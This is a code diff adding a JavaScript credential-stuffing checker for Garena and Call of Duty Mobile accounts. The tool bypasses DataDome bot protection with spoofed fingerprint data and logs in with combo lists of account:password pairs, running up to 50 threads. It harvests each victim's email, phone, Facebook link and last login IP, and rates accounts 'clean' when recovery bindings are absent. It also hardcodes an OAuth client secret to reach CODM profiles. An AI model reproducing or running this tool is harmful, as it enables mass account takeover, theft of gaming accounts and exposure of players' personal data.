+      bid: "NA", mmt: "application/pdf,text/pdf",
+      plu: "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
+      hdn: false, awe: false, geb: false, dat: false, med: "defined", aco: "probably",
+      acots: false, acmp: "probably", acmpts: true, acw: "probably", acwts: false,
+      acma: "maybe", acmats: false, ac3: "", ac3ts: false, acf: "probably", acfts: false,
+      acmp4: "maybe", acmp4ts: false, acmp3: "probably", acmp3ts: false, acwm: "maybe",
+      acwmts: false, ocpt: false, vco: "", vcots: false, vch: "probably", vchts: true,
+      vcw: "probably", vcwts: true, vc3: "maybe", vc3ts: false, vcmp: "", vcmpts: false,
+      vcq: "maybe", vcqts: false, vc1: "probably", vc1ts: true, dvm: 8, sqt: false,
+      so: "landscape-primary", bda: false, wdw: true, prm: true, tzp: true, cvs: true,
+      usb: true, cap: true, tbf: false, lgs: true, tpd: true
+    });
+
+    const payload = new URLSearchParams({
+      jsData: jsData,
+      eventCounters: '[]',
+      jsType: 'ch',
+      cid: this.DATADOME_CID,
+      ddk: this.DATADOME_DDK,
+      Referer: 'https://account.garena.com/',
+      request: '/',
+      responsePage: 'origin',
+      ddv: '4.35.4'
+    });
+
+    try {
+      const { status, json, text } = await HTTPClient.getJson(url, {
+        method: 'POST',
+        headers: {
+          'accept': '*/*',
+          'content-type': 'application/x-www-form-urlencoded',
+          'origin': 'https://account.garena.com',
+          'referer': 'https://account.garena.com/',
+        },
+        body: payload.toString()
+      });
+
+      if (json && json.status === 200 && json.cookie) {
+        let dd = json.cookie;
+        if (dd.includes('=')) {
+          dd = dd.split(';')[0].split('=')[1];
         }
+        HTTPClient.setCookie('datadome', dd, 'garena');
+        UI.log(`✓ DataDome cookie obtained: ${dd.substring(0, 20)}...`, 'success');
+        return dd;
+      } else {
+        UI.log(`✗ DataDome fetch failed: ${text.substring(0, 100)}`, 'error');
+        return null;
+      }
+    } catch(e) {
+      UI.log(`✗ DataDome error: ${e.message}`, 'error');
+      return null;
+    }
+  },
 
-        closeModalBtn.addEventListener('click', () => resultModal.classList.remove('active'));
-        resultModal.addEventListener('click', (e) => {
-            if (e.target === resultModal) resultModal.classList.remove('active');
-        });
+  async prelogin(account) {
+    const url = 'https://sso.garena.com/api/prelogin';
+    const params = {
+      app_id: '10100',
+      account: account,
+      format: 'json',
+      id: String(Date.now())
+    };
+    const fullUrl = url + '?' + new URLSearchParams(params).toString();
 
-        // --- API Calls ---
-        async function apiCall(endpoint, data) {
-            try {
-                const response = await fetch(endpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                return await response.json();
-            } catch (e) {
-                addLog('error', `API error: ${e.message}`);
-                return null;
-            }
+    const headers = {
+      'accept': 'application/json, text/plain, */*',
+      'accept-language': 'en-US,en;q=0.9',
+      'host': 'sso.garena.com',
+      'referer': `https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account=${encodeURIComponent(account)}`,
+      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
+    };
+
+    const cookieStr = HTTPClient.getCookies(['garena']);
+    if (cookieStr) {
+      headers['X-Proxy-Cookie'] = cookieStr;
+    }
+
+    const { status, json, text } = await HTTPClient.getJson(fullUrl, { headers, redirect: 'follow' });
+
+    if (status === 403) {
+      UI.log(`Prelogin 403 — refreshing DataDome...`, 'warning');
+      const dd = await this.fetchDatadome();
+      if (dd) {
+        return await this.prelogin(account);
+      }
+      return { error: '403', v1: null, v2: null };
+    }
+
+    if (!json) {
+      return { error: 'invalid_json', v1: null, v2: null };
+    }
+
+    if (json.error) {
+      return { error: json.error, v1: null, v2: null };
+    }
+
+    return { error: null, v1: json.v1, v2: json.v2 };
+  },
+
+  async login(account, password, v1, v2) {
+    const hashedPassword = await Crypto.hashPassword(password, v1, v2);
+    const url = 'https://sso.garena.com/api/login';
+    const params = {
+      app_id: '10100',
+      account: account,
+      password: hashedPassword,
+      redirect_uri: 'https://account.garena.com/',
+      format: 'json',
+      id: String(Date.now())
+    };
+    const fullUrl = url + '?' + new URLSearchParams(params).toString();
+
+    const headers = {
+      'accept': 'application/json, text/plain, */*',
+      'referer': 'https://account.garena.com/',
+      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
+    };
+
+    const cookieStr = HTTPClient.getCookies(['garena']);
+    if (cookieStr) {
+      headers['X-Proxy-Cookie'] = cookieStr;
+    }
+
+    const { status, json, text, headers: respHeaders } = await HTTPClient.getJson(fullUrl, { headers, redirect: 'follow' });
+
+    // Extract sso_key from cookies (set-cookie or already in cookie jar)
+    const ssoKey = HTTPClient.cookies['garena']?.['sso_key'] || null;
+
+    if (status === 403) {
+      return { error: '403', ssoKey: null };
+    }
+
+    if (!json) {
+      return { error: 'invalid_json', ssoKey: null };
+    }
+
+    if (json.error) {
+      return { error: json.error, ssoKey: null };
+    }
+
+    return { error: null, ssoKey };
+  },
+
+  async getAccountInfo() {
+    const url = 'https://account.garena.com/api/account/init';
+    const headers = {
+      'accept': '*/*',
+      'referer': 'https://account.garena.com/',
+      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
+    };
+
+    const cookieStr = HTTPClient.getCookies(['garena']);
+    if (cookieStr) {
+      headers['X-Proxy-Cookie'] = cookieStr;
+    }
+
+    const { status, json, text } = await HTTPClient.getJson(url, { headers, redirect: 'follow' });
+
+    if (status === 403) {
+      return { error: '403', data: null };
+    }
+
+    if (!json) {
+      return { error: 'invalid_json', data: null };
+    }
+
+    if (json.error) {
+      return { error: json.error, data: null };
+    }
+
+    return { error: null, data: json };
+  }
+};
+
+/* ═══════════════════════════════════════════════════════════════
+   CODM API — OAuth grant, exchange, callback, user info
+   ═══════════════════════════════════════════════════════════════ */
+
+const CODMAPI = {
+  CLIENT_ID: '100082',
+  CLIENT_SECRET: '388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415',
+  REDIRECT_URI: 'gop100082://auth/',
+
+  async getGrantCode() {
+    const url = 'https://100082.connect.garena.com/oauth/token/grant';
+    const body = new URLSearchParams({
+      client_id: this.CLIENT_ID,
+      response_type: 'code',
+      redirect_uri: this.REDIRECT_URI,
+      create_grant: 'true',
+      login_scenario: 'normal',
+      format: 'json',
+      id: String(Date.now())
+    });
+
+    const headers = {
+      'accept': 'application/json, text/plain, */*',
+      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+      'origin': 'https://100082.connect.garena.com',
+      'user-agent': 'Mozilla/5.0 (Linux; Android 9; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36 GarenaMSDK/5.12.1',
+      'x-requested-with': 'com.garena.game.codm'
+    };
+
+    const cookieStr = HTTPClient.getCookies(['garena']);
+    if (cookieStr) headers['X-Proxy-Cookie'] = cookieStr;
+
+    const { status, json, text } = await HTTPClient.getJson(url, {
+      method: 'POST',
+      headers,
+      body: body.toString()
+    });
+
+    if (json && json.code) {
+      return json.code;
+    }
+    UI.log(`Grant code failed: ${text.substring(0, 80)}`, 'error');
+    return '';
+  },
+
+  async tokenExchange(code) {
+    const url = 'https://100082.connect.garena.com/oauth/token/exchange';
+    const deviceId = '02-' + crypto.randomUUID();
+    const body = new URLSearchParams({
+      grant_type: 'authorization_code',
+      code: code,
+      device_id: deviceId,
+      redirect_uri: this.REDIRECT_URI,
+      source: '2',
+      client_id: this.CLIENT_ID,
+      client_secret: this.CLIENT_SECRET
+    });
+
+    const headers = {
+      'user-agent': 'GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)',
+      'content-type': 'application/x-www-form-urlencoded',
+      'host': '100082.connect.garena.com'
+    };
+
+    const { status, json, text } = await HTTPClient.getJson(url, {
+      method: 'POST',
+      headers,
+      body: body.toString()
+    });
+
+    if (json && json.access_token) {
+      return json.access_token;
+    }
+    UI.log(`Token exchange failed: ${text.substring(0, 80)}`, 'error');
+    return '';
+  },
+
+  async processCallback(accessToken) {
+    try {
+      const callbackUrl = `https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request-aos.codm.garena.co.id/oauth/callback/&access_token=${accessToken}`;
+      const headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'referer': 'https://auth.garena.com/',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
+      };
+
+      const cookieStr = HTTPClient.getCookies(['garena']);
+      if (cookieStr) headers['X-Proxy-Cookie'] = cookieStr;
+
+      // First callback
+      await HTTPClient.request(callbackUrl, { headers, redirect: 'follow' });
+
+      // Second callback — try to get Location header
+      const apiCallbackUrl = `https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
+      const resp = await HTTPClient.request(apiCallbackUrl, { headers, redirect: 'follow' });
+
+      // Try to get Location from headers
+      let location = '';
+      try {
+        location = resp.headers.get('location') || resp.headers.get('Location') || '';
+      } catch(e) {}
+
+      // If no location, try to read from response URL or body
+      if (!location) {
+        try {
+          const text = await resp.text();
+          // Some proxies include redirect info in body
+          const locMatch = text.match(/token=([^&\s]+)/);
+          if (locMatch) {
+            return { token: locMatch[1], status: 'success' };
+          }
+          if (text.includes('err=3')) {
+            return { token: null, status: 'no_codm' };
+          }
+        } catch(e) {}
+      }
+
+      if (location.includes('err=3')) {
+        return { token: null, status: 'no_codm' };
+      }
+      if (location.includes('token=')) {
+        const token = location.split('token=')[1].split('&')[0];
+        return { token, status: 'success' };
+      }
+
+      // Fallback: try manual redirect handling
+      return { token: null, status: 'unknown' };
+    } catch(e) {
+      UI.log(`CODM callback error: ${e.message}`, 'error');
+      return { token: null, status: 'error' };
+    }
+  },
+
+  async getUserInfo(token) {
+    const url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/';
+    const headers = {
+      'accept': 'application/json, text/plain, */*',
+      'codm-delete-token': token,
+      'origin': 'https://delete-request.codm.garena.co.id',
+      'referer': 'https://delete-request.codm.garena.co.id/',
+      'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+      'x-requested-with': 'XMLHttpRequest'
+    };
+
+    const { status, json, text } = await HTTPClient.getJson(url, { headers, redirect: 'follow' });
+
+    if (json && json.user) {
+      const u = json.user;
+      return {
+        codm_nickname: u.codm_nickname || 'N/A',
+        codm_level: u.codm_level || 0,
+        region: u.region || 'N/A',
+        region_code: u.region || 'N/A',
+        uid: u.uid || 'N/A',
+        open_id: u.open_id || 'N/A'
+      };
+    }
+    return {};
+  },
+
+  async checkAccount() {
+    UI.log('Starting CODM OAuth flow...', 'info');
+    
+    const code = await this.getGrantCode();
+    if (!code) return { has_codm: false, info: {} };
+    UI.log(`Grant code obtained`, 'success');
+
+    const accessToken = await this.tokenExchange(code);
+    if (!accessToken) return { has_codm: false, info: {} };
+    UI.log(`Access token obtained`, 'success');
+
+    const { token, status } = await this.processCallback(accessToken);
+    if (status === 'no_codm') {
+      UI.log('No CODM account', 'warning');
+      return { has_codm: false, info: {} };
+    }
+    if (status !== 'success' || !token) {
+      UI.log(`Callback status: ${status}`, 'warning');
+      return { has_codm: false, info: {} };
+    }
+    UI.log(`CODM token obtained`, 'success');
+
+    const info = await this.getUserInfo(token);
+    if (info && info.uid) {
+      UI.log(`CODM found: Lv${info.codm_level} | ${info.codm_nickname} | ${info.region}`, 'highlight');
+      return { has_codm: true, info };
+    }
+    return { has_codm: false, info: {} };
+  }
+};
+
+/* ═══════════════════════════════════════════════════════════════
+   ACCOUNT PARSER — Parse user_info from Garena API
+   ═══════════════════════════════════════════════════════════════ */
+
+function parseAccountDetails(data) {
+  const ui = data.user_info || data;
+
+  const fbAccount = ui.fb_account || {};
+  const fbUid = fbAccount.fb_uid || 'N/A';
+  const fbUsername = fbAccount.fb_username || 'N/A';
+
+  const mobileNo = ui.mobile_no || 'N/A';
+  const emailVerified = ui.email_v ? true : false;
+  const email = ui.email || 'N/A';
+
+  const mobileIsNA = !mobileNo || mobileNo === 'N/A' || String(mobileNo).trim() === '';
+  const isClean = mobileIsNA && !emailVerified;
+
+  const binds = [];
+  if (email && email !== 'N/A' && String(email).trim() && !email.startsWith('***')) {
+    binds.push(emailVerified ? 'Email (Verified)' : 'Email');
+  }
+  if (!mobileIsNA) binds.push('Phone');
+  if (ui.is_fbconnect_enabled && fbUid !== 'N/A') binds.push('Facebook');
+  if (ui.idcard && ui.idcard !== 'N/A') binds.push('ID Card');
+  if (ui.two_step_verify_enable) binds.push('2FA');
+  if (ui.authenticator_enable) binds.push('Authenticator');
+
+  let emailDisplay = 'N/A';
+  if (email && email !== 'N/A' && email.includes('@')) {
+    emailDisplay = email + (emailVerified ? ' (Verified)' : ' (Not Verified)');
+  }
+
+  let fbInfo = 'NOT CONNECTED';
+  let fbLink = 'N/A';
+  if (fbUid !== 'N/A' && fbUid) {
+    fbLink = `https://www.facebook.com/profile.php?id=${fbUid}`;
+    if (!fbUsername || fbUsername === 'N/A') {
+      fbInfo = 'FB UNBIND or FB DELETED';
+    } else {
+      fbInfo = 'CONNECTED';
+    }
+  }
+
+  const loginHistory = data.login_history || [];
+  const lastLogin = loginHistory[0] || {};
+  const lastLoginTs = lastLogin.timestamp || 0;
+  const lastLoginDate = lastLoginTs
+    ? new Date(lastLoginTs * 1000).toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' })
+    : 'N/A';
+
+  return {
+    uid: ui.uid || 'N/A',
+    username: ui.username || 'N/A',
+    nickname: ui.nickname || 'N/A',
+    email: email,
+    email_display: emailDisplay,
+    email_verified: emailVerified,
+    country: ui.acc_country || 'N/A',
+    country_code: ui.country_code || 'N/A',
+    mobile_no: mobileNo,
+    shell_balance: ui.shell || 0,
+    account_status: ui.status === 1 ? 'Active' : 'Inactive',
+    fb_username: fbUsername,
+    fb_uid: fbUid,
+    fb_link: fbLink,
+    fb_info: fbInfo,
+    binds: binds,
+    bind_status: isClean ? 'Clean' : 'Not Clean',
+    is_clean: isClean,
+    last_login_date: lastLoginDate,
+    last_login_where: lastLogin.source || 'Unknown',
+    last_login_ip: lastLogin.ip || 'N/A',
+    last_login_country: lastLogin.country || 'N/A'
+  };
+}
+
+function formatMobile(mobileNo, countryCode) {
+  if (!mobileNo || mobileNo === 'N/A') return 'N/A';
+  let s = String(mobileNo).replace(/[+\-\s]/g, '');
+  if (countryCode && !s.startsWith(countryCode)) {
+    s = (s.startsWith('0') ? countryCode + s.slice(1) : countryCode + s);
+  }
+  if (s.length >= 4) {
+    return '+' + s.slice(0, -4).replace(/./g, '*') + s.slice(-4);
+  }
+  return '+' + s;
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   CHECKER — Single, Bulk, Validator
+   ═══════════════════════════════════════════════════════════════ */
+
+const Checker = {
+  running: false,
+  validatorRunning: false,
+  totalAccounts: 0,
+  processedCount: 0,
+  startTime: 0,
+
+  async checkOne(account, password) {
+    UI.log(`Checking: ${account}`, 'info');
+
+    // Step 1: Ensure DataDome cookie
+    let dd = HTTPClient.cookies['garena']?.['datadome'] || HTTPClient.datadomeOverride;
+    if (!dd) {
+      dd = await GarenaAPI.fetchDatadome();
+      if (!dd) {
+        return { account, password, is_error: true, error_reason: 'DataDome fetch failed' };
+      }
+    } else {
+      HTTPClient.setCookie('datadome', dd, 'garena');
+    }
+
+    // Step 2: Prelogin
+    const preResult = await GarenaAPI.prelogin(account);
+    if (preResult.error === 'ACCOUNT DOESNT EXIST' || (preResult.error && !preResult.v1)) {
+      UI.log(`✗ Account doesn't exist: ${account}`, 'error');
+      return { account, password, is_error: true, error_reason: "Account Doesn't Exist" };
+    }
+    if (!preResult.v1 || !preResult.v2) {
+      UI.log(`✗ Prelogin failed: ${preResult.error}`, 'error');
+      return { account, password, is_error: true, error_reason: preResult.error || 'Prelogin failed' };
+    }
+    UI.log(`Prelogin OK — v1/v2 obtained`, 'muted');
+
+    // Step 3: Login
+    const loginResult = await GarenaAPI.login(account, password, preResult.v1, preResult.v2);
+    if (loginResult.error === 'ACCOUNT DOESNT EXIST') {
+      UI.log(`✗ Account doesn't exist`, 'error');
+      return { account, password, is_error: true, error_reason: "Account Doesn't Exist" };
+    }
+    if (!loginResult.ssoKey) {
+      UI.log(`✗ Invalid password: ${account}`, 'error');
+      return { account, password, is_error: true, error_reason: 'Invalid Credentials' };
+    }
+    UI.log(`✓ Login successful: ${account}`, 'success');
+
+    // Step 4: Account info
+    const accResult = await GarenaAPI.getAccountInfo();
+    if (accResult.error === '403') {
+      UI.log(`✗ Cookie banned/IP blocked`, 'error');
+      return { account, password, is_error: true, error_reason: 'Cookie Banned/IP Blocked' };
+    }
+    if (accResult.error) {
+      UI.log(`✗ Account info error: ${accResult.error}`, 'error');
+      return { account, password, is_error: true, error_reason: accResult.error };
+    }
+
+    const details = parseAccountDetails(accResult.data);
+    UI.log(`Account: ${details.username} | Shell: ${details.shell_balance} | ${details.bind_status}`, 'info');
+
+    // Step 5: CODM check
+    const codmResult = await CODMAPI.checkAccount();
+
+    const accountData = {
+      account,
+      password,
+      uid: details.uid,
+      username: details.username,
+      nickname: details.nickname,
+      email: details.email,
+      email_display: details.email_display,
+      formatted_mobile: formatMobile(details.mobile_no, details.country_code),
+      country: details.country,
+      shell_balance: details.shell_balance,
+      account_status: details.account_status,
+      fb_username: details.fb_username,
+      fb_uid: details.fb_uid,
+      fb_link: details.fb_link,
+      fb_info: details.fb_info,
+      bind_status: details.bind_status,
+      is_clean: details.is_clean,
+      has_codm: codmResult.has_codm,
+      is_error: false,
+      last_login_date: details.last_login_date,
+      last_login_where: details.last_login_where,
+      last_login_ip: details.last_login_ip,
+      last_login_country: details.last_login_country
+    };
+
+    if (codmResult.has_codm && codmResult.info.uid) {
+      accountData.codm_level = parseInt(codmResult.info.codm_level) || 0;
+      accountData.codm_region = codmResult.info.region || 'N/A';
+      accountData.codm_nickname = codmResult.info.codm_nickname || 'N/A';
+      accountData.codm_uid = codmResult.info.uid || 'N/A';
+      accountData.region_code = codmResult.info.region_code || 'N/A';
+    } else {
+      accountData.codm_level = 0;
+      accountData.codm_region = 'N/A';
+      accountData.codm_nickname = 'N/A';
+      accountData.codm_uid = 'N/A';
+      accountData.region_code = 'N/A';
+    }
+
+    // Determine result type
+    if (accountData.is_error) {
+      accountData.result_type = 'error';
+    } else if (!accountData.has_codm) {
+      accountData.result_type = 'nocodm';
+    } else if (accountData.is_clean) {
+      accountData.result_type = 'clean';
+    } else {
+      accountData.result_type = 'notclean';
+    }
+
+    UI.logResult(accountData);
+    return accountData;
+  },
+
+  async singleCheck() {
+    const account = document.getElementById('single-account').value.trim();
+    const password = document.getElementById('single-password').value.trim();
+    const save = document.getElementById('single-save').checked;
+
+    if (!account || !password) {
+      UI.log('Please enter both account and password', 'error');
+      return;
+    }
+
+    document.getElementById('single-check-btn').disabled = true;
+    UI.setStatus('running', 'Checking...');
+    HTTPClient.clearCookies();
+
+    try {
+      const result = await this.checkOne(account, password);
+      UI.renderSingleResult(result);
+      if (save && !result.is_error) {
+        Results.add(result);
+      }
+    } catch(e) {
+      UI.log(`Error: ${e.message}`, 'error');
+      UI.renderSingleResult({ account, password, is_error: true, error_reason: e.message });
+    } finally {
+      document.getElementById('single-check-btn').disabled = false;
+      UI.setStatus('idle', 'Idle');
+      UI.renderCookies();
+    }
+  },
+
+  async bulkCheck() {
+    let lines = [];
+    const activeTab = document.querySelector('[data-bulk-tab].active').dataset.bulkTab;
+    
+    if (activeTab === 'paste') {
+      const text = document.getElementById('bulk-textarea').value;
+      lines = text.split('\n').map(l => l.trim()).filter(l => l && l.includes(':'));
+    } else {
+      const fileInfo = document.getElementById('file-info').dataset.content;
+      if (fileInfo) {
+        lines = fileInfo.split('\n').map(l => l.trim()).filter(l => l && l.includes(':'));
+      }
+    }
+
+    if (lines.length === 0) {
+      UI.log('No valid accounts found. Use format: account:password', 'error');
+      return;
+    }
+
+    const threads = Math.min(50, Math.max(1, parseInt(document.getElementById('bulk-threads').value) || 5));
+    this.running = true;
+    this.totalAccounts = lines.length;
+    this.processedCount = 0;
+    this.startTime = Date.now();
+
+    document.getElementById('bulk-start-btn').disabled = true;
+    document.getElementById('bulk-stop-btn').disabled = false;
+    UI.setStatus('running', `Checking ${lines.length} accounts...`);
+    Stats.reset();
+    Stats.total = lines.length;
+    Stats.start();
+
+    UI.log(`Starting bulk check: ${lines.length} accounts, ${threads} threads`, 'highlight');
+
+    const queue = lines.map(line => {
+      const idx = line.indexOf(':');
+      return { account: line.substring(0, idx).trim(), password: line.substring(idx + 1).trim() };
+    }).filter(c => c.account && c.password);
+
+    const runWorker = async () => {
+      while (queue.length > 0 && this.running) {
+        const combo = queue.shift();
+        if (!combo) break;
+
+        try {
+          // Each worker gets fresh cookies (simulating separate sessions)
+          const workerCookies = JSON.parse(JSON.stringify(HTTPClient.cookies));
+          const result = await this.checkOne(combo.account, combo.password);
+          Results.add(result);
+          Stats.update(result);
+        } catch(e) {
+          UI.log(`Error checking ${combo.account}: ${e.message}`, 'error');
+          Stats.update({ is_error: true });
+        } finally {
+          this.processedCount++;
+          this.updateBulkProgress();
         }
+      }
+    };
 
-        // --- Start Bulk Check ---
-        async function startBulkCheck() {
-            if (state.isRunning) return;
-            if (state.accounts.length === 0) {
-                addLog('error', 'No accounts loaded. Please upload a file first.');
-                return;
-            }
+    const workers = [];
+    for (let i = 0; i < threads; i++) {
+      workers.push(runWorker());
+    }
 
-            state.isRunning = true;
-            state.processed = 0;
-            state.stats = { valid: 0, invalid: 0, clean: 0, codm: 0, error: 0 };
-            state.startTime = Date.now();
+    await Promise.all(workers);
 
-            startBulkBtn.disabled = true;
-            stopBulkBtn.disabled = false;
-            progressContainer.classList.add('active');
-            updateStats();
+    this.running = false;
+    document.getElementById('bulk-start-btn').disabled = false;
+    document.getElementById('bulk-stop-btn').disabled = true;
+    UI.setStatus('idle', 'Idle');
+    UI.log(`Bulk check complete. Processed ${this.processedCount} accounts.`, 'success');
+    Stats.stop();
+  },
 
-            addLog('info', `🚀 Starting bulk check with ${state.accounts.length} accounts`);
+  stopBulk() {
+    this.running = false;
+    UI.log('Stopping after current account...', 'warning');
+    document.getElementById('bulk-stop-btn').disabled = true;
+  },
 
-            const batchSize = parseInt(threadCount.value) || 5;
-            const total = state.accounts.length;
-            let index = 0;
+  updateBulkProgress() {
+    const pct = (this.processedCount / this.totalAccounts * 100).toFixed(1);
+    document.getElementById('bulk-progress').style.width = pct + '%';
+    document.getElementById('bulk-progress-text').textContent = pct + '%';
+    document.getElementById('bulk-count').textContent = `${this.processedCount} / ${this.totalAccounts}`;
+    
+    const elapsed = (Date.now() - this.startTime) / 1000;
+    const rate = this.processedCount / elapsed;
+    const remaining = this.totalAccounts - this.processedCount;
+    const eta = rate > 0 ? remaining / rate : 0;
+    
+    document.getElementById('bulk-speed').textContent = rate.toFixed(1) + ' acc/s';
+    document.getElementById('bulk-eta').textContent = `ETA: ${Math.floor(eta / 60)}m ${Math.floor(eta % 60)}s`;
+    
+    document.getElementById('speed-display').textContent = rate.toFixed(1);
+    document.getElementById('thread-count').textContent = document.getElementById('bulk-threads').value;
+    
+    Stats.render();
+  },
 
-            async function processBatch() {
-                const batch = [];
-                while (index < total && batch.length < batchSize) {
-                    batch.push(state.accounts[index]);
-                    index++;
-                }
-                if (batch.length === 0) return;
+  async startValidator() {
+    let lines = [];
+    const activeTab = document.querySelector('[data-val-tab].active').dataset.valTab;
+    
+    if (activeTab === 'paste') {
+      const text = document.getElementById('val-textarea').value;
+      lines = text.split('\n').map(l => l.trim()).filter(l => l && l.includes(':'));
+    } else {
+      const fileInfo = document.getElementById('val-file-info').dataset.content;
+      if (fileInfo) {
+        lines = fileInfo.split('\n').map(l => l.trim()).filter(l => l && l.includes(':'));
+      }
+    }
 
-                const results = await Promise.all(batch.map(async (acc) => {
-                    const result = await apiCall('/api/check', {
-                        account: acc.account,
-                        password: acc.password
-                    });
-                    return result;
-                }));
+    if (lines.length === 0) {
+      UI.log('No valid accounts found', 'error');
+      return;
+    }
 
-                results.forEach(result => {
-                    if (result) {
-                        state.processed++;
-                        if (result.is_error) {
-                            state.stats.error++;
-                            addLog('error', `${result.account}: ${result.error_reason || 'Error'}`);
-                        } else if (result.is_valid) {
-                            state.stats.valid++;
-                            if (result.is_clean) state.stats.clean++;
-                            if (result.has_codm) state.stats.codm++;
-                            
-                            const status = result.is_clean ? 'CLEAN' : 'NOT CLEAN';
-                            const codm = result.has_codm ? `CODM Lv${result.codm_level}` : 'NO CODM';
-                            addLog(result.is_clean ? 'clean' : 'valid', 
-                                `${result.account} → ${status} | ${codm}`);
-                            
-                            // Show result for valid accounts
-                            if (result.has_codm) {
-                                // Could show modal but would be spammy - we'll show on click later
-                            }
-                        } else {
-                            state.stats.invalid++;
-                            addLog('invalid', `${result.account}: Invalid credentials`);
-                        }
-                    }
-                    updateStats();
-                });
+    const threads = Math.min(50, Math.max(1, parseInt(document.getElementById('val-threads').value) || 10));
+    this.validatorRunning = true;
+    let processed = 0, valid = 0, invalid = 0, errors = 0;
+    const total = lines.length;
+    const startTime = Date.now();
 
-                if (index < total && state.isRunning) {
-                    setTimeout(processBatch, 100);
-                } else {
-                    finishBulkCheck();
-                }
-            }
+    document.getElementById('val-start-btn').disabled = true;
+    document.getElementById('val-stop-btn').disabled = false;
+    UI.setStatus('running', `Validating ${total} accounts...`);
 
-            processBatch();
-        }
+    UI.log(`Validator started: ${total} accounts, ${threads} threads`, 'highlight');
 
-        function finishBulkCheck() {
-            state.isRunning = false;
-            startBulkBtn.disabled = false;
-            stopBulkBtn.disabled = true;
-            addLog('info', `✅ Bulk check complete! Processed ${state.processed} accounts`);
-            updateStats();
-        }
+    const queue = lines.map(line => {
+      const idx = line.indexOf(':');
+      return { account: line.substring(0, idx).trim(), password: line.substring(idx + 1).trim() };
+    }).filter(c => c.account && c.password);
 
-        // --- Stop Bulk Check ---
-        stopBulkBtn.addEventListener('click', function() {
-            state.isRunning = false;
-            startBulkBtn.disabled = false;
-            this.disabled = true;
-            addLog('info', '⏹️ Bulk check stopped by user');
-        });
+    const runWorker = async () => {
+      while (queue.length > 0 && this.validatorRunning) {
+        const combo = queue.shift();
+        if (!combo) break;
 
-        // --- Start Single Check ---
-        async function startSingleCheck() {
-            const account = singleAccount.value.trim();
-            const password = singlePassword.value.trim();
-            
-            if (!account || !password) {
-                addLog('error', 'Please enter both username and password');
-                return;
-            }
+        try {
+          // Login only — no account info or CODM check
+          let dd = HTTPClient.cookies['garena']?.['datadome'] || HTTPClient.datadomeOverride;
+          if (!dd) {
+            dd = await GarenaAPI.fetchDatadome();
+            if (!dd) { errors++; processed++; continue; }
+          } else {
+            HTTPClient.setCookie('datadome', dd, 'garena');
+          }
 
-            startSingleBtn.disabled = true;
-            addLog('info', `🔍 Checking single account: ${account}`);
-
-            const result = await apiCall('/api/check', { account, password });
-            
-            if (result) {
-                if (result.is_error) {
-                    addLog('error', `${account}: ${result.error_reason || 'Error'}`);
-                } else if (result.is_valid) {
-                    addLog('clean', `${account}: ${result.is_clean ? 'CLEAN' : 'NOT CLEAN'} | ${result.has_codm ? 'CODM Found' : 'No CODM'}`);
-                    showResult(result);
-                } else {
-                    addLog('invalid', `${account}: Invalid credentials`);
-                }
-            }
-            
-            startSingleBtn.disabled = false;
-        }
-
-        // --- Event Listeners ---
-        startBulkBtn.addEventListener('click', startBulkCheck);
-        startSingleBtn.addEventListener('click', startSingleCheck);
-
-        // Enter key for single check
-        singlePassword.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') startSingleCheck();
-        });
-
-        // --- Simulated backend (for demo purposes) ---
-        // In a real implementation, this would connect to the Python backend
-        // For demo, we'll simulate responses
-        async function mockApiCheck(data) {
-            // Simulate network delay
-            await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
-            
-            const acc = data.account;
-            const pwd = data.password;
-            
-            // Simulate various outcomes based on account name
-            const hash = acc.split('').reduce((a, c) => a + c.charCodeAt(0), 0);
-            const outcome = hash % 5;
-            
-            if (outcome === 0) {
-                return {
-                    account: acc,
-                    password: pwd,
-                    is_valid: true,
-                    is_clean: true,
-                    has_codm: true,
-                    codm_level: 150 + Math.floor(Math.random() * 250),
-                    codm_region: ['PH', 'ID', 'SG', 'MY', 'TH'][hash % 5],
-                    codm_nickname: `Player_${acc.substring(0, 4)}`,
-                    uid: `UID_${Date.now()}_${hash}`,
-                    username: `user_${acc}`,
-                    nickname: `Player_${acc.substring(0, 6)}`,
-                    email_display: `${acc}@garena.com (Verified)`,
-                    formatted_mobile: '+63 ****1234',
-                    country: 'Philippines',
-                    shell_balance: Math.floor(Math.random() * 1000),
-                    fb_info: 'CONNECTED',
-                    is_error: false,
-                    last_login_date: new Date().toLocaleString()
-                };
-            } else if (outcome === 1) {
-                return {
-                    account: acc,
-                    password: pwd,
-                    is_valid: true,
-                    is_clean: false,
-                    has_codm: true,
-                    codm_level: 50 + Math.floor(Math.random() * 100),
-                    codm_region: 'ID',
-                    codm_nickname: `Player_${acc.substring(0, 4)}`,
-                    uid: `UID_${Date.now()}_${hash}`,
-                    username: `user_${acc}`,
